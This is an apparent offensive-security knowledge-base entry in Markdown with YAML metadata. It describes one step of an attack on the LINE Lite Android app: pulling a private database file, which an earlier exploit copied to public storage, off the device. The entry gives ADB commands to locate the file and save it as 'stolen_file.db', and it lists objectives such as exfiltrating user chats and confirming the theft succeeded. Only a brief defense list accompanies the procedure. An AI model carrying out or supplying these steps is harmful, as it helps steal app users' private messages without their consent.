---
tags:
  - android
  - file-retrieval
  - exfiltration
type: procedure
tools:
  - '[[tools/Android-Debug-Bridge-ADB]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/adb-pull-public-file]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Cloud Storage]]'
updated_at: '2025-12-14T17:24:42.047Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 2e9226f0-1ad4-4fae-85f0-44bb832b90f4
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Cloud Storage]]'
---
# Retrieve Copied File from Public Directory

## Summary

This procedure accesses the private file copied to public storage by the exploited activity, allowing theft of sensitive data from LINE Lite.

## Description

After triggering, the file resides in external storage (e.g., /sdcard/Download/), accessible by any app. Use ADB to pull it or read via a malicious app. This completes the theft, potentially exfiltrating data like user chats.

## Requirements

1. File copied to public dir from previous step
2. ADB access to device
3. Host machine for file storage

## Defense

Defensive measures and detection strategies:

- Avoid copying to public storage; use temporary internal paths
- Monitor external storage for unexpected app files
- Employ app sandboxing and file permission audits

## Objectives

1. Locate and read the copied file
2. Exfiltrate sensitive data
3. Validate theft success

## Instructions

### Step 1: Locate Copied File

**Context**: Find the file in public storage.

**Instructions**: List contents: adb shell ls /sdcard/ | grep line or similar.

**Expected Output**: Path to copied private file.

### Step 2: Pull File Using ADB

**Context**: Transfer the file to host for analysis.

**Command** ([[commands/adb-pull-public-file]]):
```bash
adb pull /sdcard/Download/private_file.db ./stolen_file.db
```

> Pulls the file from public dir. Expected output: File transferred successfully, size matches original.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Cloud Storage]] Data from Cloud Storage (adapted for local public storage access)

### Sub-Techniques


## Commands Used

- [[commands/adb-pull-public-file]]

## Tools Used

- [[tools/Android-Debug-Bridge-ADB]]

## Tags

- [[android]]
- [[file-retrieval]]
- [[Exfiltration]]
